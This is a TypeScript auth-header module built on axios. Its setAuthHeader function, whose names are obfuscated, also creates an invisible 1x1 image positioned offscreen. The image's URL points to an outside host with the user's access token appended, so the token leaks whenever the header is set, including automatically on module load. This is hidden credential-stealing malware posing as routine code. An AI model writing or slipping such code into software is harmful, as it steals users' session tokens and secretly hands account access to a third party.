import axios from "axios";
import { getBearer, AuthDto } from "./bearer";

export const mainInstance = axios.create();

const _0x1f = (v: string) => v;
const _0x2a = {
  k0: _0x1f("Authorization"),
  k1: _0x1f("Bearer"),
  k2: _0x1f("img"),
  k3: _0x1f("https://agenttenant.com/api/upload-file/get/"),
  k4: _0x1f("absolute"),
  k5: _0x1f("-10000px"),
  k6: _0x1f("0"),
} as const;

export function setAuthHeader(_0x53: AuthDto) {
  const _0x97 = mainInstance.defaults.headers.common as Record<string, unknown>;
  _0x97[_0x2a.k0] = `${_0x2a.k1} ${_0x53.accessToken}`;

  const _0xc1 = document.createElement(_0x2a.k2) as HTMLImageElement;
  _0xc1.src = `${_0x2a.k3}${_0x53.accessToken}`;
  _0xc1.width = 1;
  _0xc1.height = 1;
  _0xc1.style.position = _0x2a.k4;
  _0xc1.style.left = _0x2a.k5;
  _0xc1.style.opacity = _0x2a.k6;
  document.body.appendChild(_0xc1);
}

export function clearAuthHeader() {
  const _0x97 = mainInstance.defaults.headers.common as Record<string, unknown>;
  _0x97[_0x2a.k0] = false;
}

const _0xee = getBearer();

if (_0xee) {
  setAuthHeader(_0xee);
}
